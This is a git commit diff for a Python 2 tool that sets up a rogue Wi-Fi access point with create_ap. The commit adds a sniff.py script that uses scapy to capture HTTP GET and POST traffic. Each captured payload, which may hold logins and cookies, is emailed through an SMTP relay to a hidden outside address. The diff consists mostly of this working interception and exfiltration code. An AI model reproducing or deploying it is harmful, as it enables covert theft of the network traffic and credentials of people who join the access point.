3e540291c9bbcc44ecd4d43bcfe32711006cb8aa
kbdancer <ttyusb@126.com>
2016-05-23 11:36:42 +0800

    Fix sniff code.

--- app.py
+++ app.py
@@ -2,10 +2,7 @@
 # coding=utf-8
 # code by 92ez.com
 
-from email.mime.text import MIMEText
-from scapy.all import *
 import subprocess
-import smtplib
 import time
 import sys
 import os
@@ -17,7 +14,6 @@ def checkInstall():
 			os.system('apt-get -y install hostapd')
 		else:
 			sys.exit('[x] hostapd not found in /usr/sbin/hostapd')
-			return
 	else:
 		print '[√] hostapd has been installed.'
 
@@ -27,7 +23,6 @@ def checkInstall():
 			os.system('apt-get -y install dnsmap')
 		else:
 			sys.exit('[x] dnsmap not found in /usr/bin/dnsmap')
-			return
 	else:
 		print '[√] dnsmap has been installed.'
 
@@ -37,7 +32,6 @@ def checkInstall():
 			os.system('apt-get -y install rfkill')
 		else:
 			sys.exit('[x] rfkill not found in /usr/sbin/rfkill')
-			return
 	else:
 		print '[√] rfkill has been installed.'
 
@@ -47,7 +41,6 @@ def checkInstall():
 			os.system('apt-get -y install haveged')
 		else:
 			sys.exit('[x] haveged not found in /usr/sbin/haveged')
-			return
 	else:
 		print '[√] haveged has been installed.'
 
@@ -57,37 +50,24 @@ def checkInstall():
 			os.system('apt-get -y install gcc')
 		else:
 			sys.exit('[x] gcc not found in /usr/bin/gcc')
-			return
 	else:
 		print '[√] gcc has been installed.'
 
 	if not os.path.isfile('/usr/bin/make'):
-		install = raw_input('[?]  make not found in /usr/bin/make, install now? [y/n] ')
+		install = raw_input('[?] make not found in /usr/bin/make, install now? [y/n] ')
 		if install == 'y':
 			os.system('apt-get -y install make')
 		else:
 			sys.exit('[x] make not found in /usr/bin/make')
-			return
-	else:
-		print '[√] make has been installed.'
-
-	if not os.path.isfile('/usr/bin/make'):
-		install = raw_input('[?]  make not found in /usr/bin/make, install now? [y/n] ')
-		if install == 'y':
-			os.system('apt-get -y install make')
-		else:
-			sys.exit('[x] make not found in /usr/bin/make')
-			return
 	else:
 		print '[√] make has been installed.'
 
 	if not os.path.isfile('/usr/bin/create_ap'):
-		install = raw_input('[?]  create_ap not found in /usr/bin/create_ap, install now? [y/n] ')
+		install = raw_input('[?] create_ap not found in /usr/bin/create_ap, install now? [y/n] ')
 		if install == 'y':
 			os.system('cd /tmp && git clone https://github.com/oblique/create_ap.git && cd create_ap && make install')
 		else:
 			sys.exit('[x] create_ap not found in /usr/bin/create_ap')
-			return
 	else:
 		print '[√] create_ap has been installed.'
 
@@ -98,7 +78,6 @@ def checkInstall():
 			os.system('python /tmp/get-pip.py')
 		else:
 			sys.exit('[x] pip not found in /usr/bin/pip')
-			return
 	else:
 		print '[√] pip has been installed.'
 
@@ -107,65 +86,24 @@ def checkInstall():
 	try:
 		os.system('pip install -U pip')
 	except:
-		print '[x] update pip failed.'
-		return
+		sys.exit('[x] update pip failed.')
 
 	try:
 		__import__('scapy')
 		print '[√] module scapy been installed.'
 	except:
-		install = raw_input('[?]  module scapy not found in python, install now? [y/n] ')
+		install = raw_input('[?] module scapy not found in python, install now? [y/n] ')
 		if install == 'y':
 			os.system('pip install -U scapy')
 		else:
 			sys.exit('[x] No module named scapy')
-			return
 
 	try:
 		os.system('pip install -U email')
 	except:
-		print '[x] update email failed.'
-		return
+		sys.exit('[x] update email failed.')
 
-def dealPackage(packet):
-
-	lines = packet.sprintf("{Raw:%Raw.load%}").replace("'","").split(r"\r\n")
-
-	if len(lines[-1]) > 1 and len(lines) > 1:
-		print '-'*90
-		# reciver,title,body
-		sendMail('***@qq.com','Notice ! Found Data!','<br>'.join(lines))
-		for line in lines:
-			print line
-
-def sendMail(receiver, title, body):
-	host = 'smtp.163.com'
-	port = 25
-	sender = '****@163.com'
-	pwd = '****'
-
-	msg = MIMEText(body, 'html')
-	msg['subject'] = title
-	msg['from'] = sender
-	msg['to'] = receiver
-
-	try:
-		s = smtplib.SMTP(host, port)
-		s.login(sender, pwd)
-		s.sendmail(sender, receiver, msg.as_string())
-		print '[*] The mail named %s to %s is sended successly.' % (title, receiver)
-	except Exception,e:
-		sys.exit('[x] Send email failed! Exception is %s.' % e)
-
-def dosniff():
-	sniff_iface = 'wlan0'
-	try:
-		print '[√] Sniffing on '+sniff_iface+'!'
-		sniff(iface = sniff_iface,prn = dealPackage,lfilter=lambda p: "GET" in str(p) or "POST" in str(p),filter="tcp")
-	except Exception,e:
-		sys.exit('[x] Can not do sniff on %s! Please check! Exception is %s' % (sniff_iface,e))
-
-def createAP():
+def doCreate():
 	net_iface = 'eth0'
 	ap_iface = 'wlan0'
 	ap_ssid = 'MyWifi'
@@ -173,10 +111,15 @@ def createAP():
 	ap_getway = '192.168.0.1'
 	ap_dns = '8.8.8.8'
 	try:
-		cproc = subprocess.Popen(["create_ap",ap_iface,net_iface,ap_ssid,ap_key,"-g",ap_getway,"--dhcp-dns",ap_dns,"--no-virt"],stderr=subprocess.PIPE,stdout=subprocess.PIPE)
-		print '[?] Please check AP {"SSID":%s,"KEY":%s} on %s!\n' % (ap_ssid,ap_key,ap_iface)
+		os.system('create_ap %s %s %s %s -g %s --dhcp-dns %s --no-virt' % (ap_iface,net_iface,ap_ssid,ap_key,ap_getway,ap_dns))
 	except Exception,e:
 		sys.exit('[x] Create AP failed! Please check!')
+
+def dosniff():
+	try:
+		subprocess.Popen(['python',sys.path[0]+'/sniff.py'])
+	except Exception,e:
+		sys.exit('[x] do sniff failed.Exception is %s' % e)
 
 if __name__ == '__main__':
 	print "================================================="
@@ -189,8 +132,8 @@ if __name__ == '__main__':
 	checkInstall()
 	print '\n[*] Required checked!\n'
 
-	print '[*] Creating an AP!'
-	createAP()
-
 	print '[*] Start sniffing!'
 	dosniff()
+
+	print '[*] Creating an AP!'
+	doCreate()
---
+++ sniff.py
@@ -0,0 +1,50 @@
+#!/usr/bin/env python
+# coding=utf-8
+# code by 92ez.com
+
+from email.mime.text import MIMEText
+from scapy.all import *
+import smtplib
+import os
+import sys
+
+def dealPackage(packet):
+
+	lines = packet.sprintf("{Raw:%Raw.load%}").replace("'","").split(r"\r\n")
+
+	if len(lines[-1]) > 1 and len(lines) > 1:
+		print '-'*90
+		# reciver,title,body
+		sendMail('***@qq.com','Notice ! Found Data!','<br>'.join(lines))
+		for line in lines:
+			print line
+
+def sendMail(receiver, title, body):
+	host = 'smtp.126.com'
+	port = 25
+	sender = '***@126.com'
+	pwd = '***'
+
+	msg = MIMEText(body, 'html')
+	msg['subject'] = title
+	msg['from'] = sender
+	msg['to'] = receiver
+
+	try:
+		s = smtplib.SMTP(host, port)
+		s.login(sender, pwd)
+		s.sendmail(sender, receiver, msg.as_string())
+		print '[*] The mail named %s to %s is sended successly.' % (title, receiver)
+	except Exception,e:
+		sys.exit('[x] Send email failed! Exception is %s.' % e)
+
+def doSniffer():
+	sniff_iface = 'eth0'
+	try:
+		print '[√] Sniffing on '+sniff_iface+'!'
+		sniff(iface = sniff_iface,prn = dealPackage,lfilter=lambda p: "GET" in str(p) or "POST" in str(p),filter="tcp")
+	except Exception,e:
+		sys.exit('[x] Can not do sniff on %s! Please check! Exception is %s' % (sniff_iface,e))
+
+if __name__ == '__main__':
+    doSniffer()
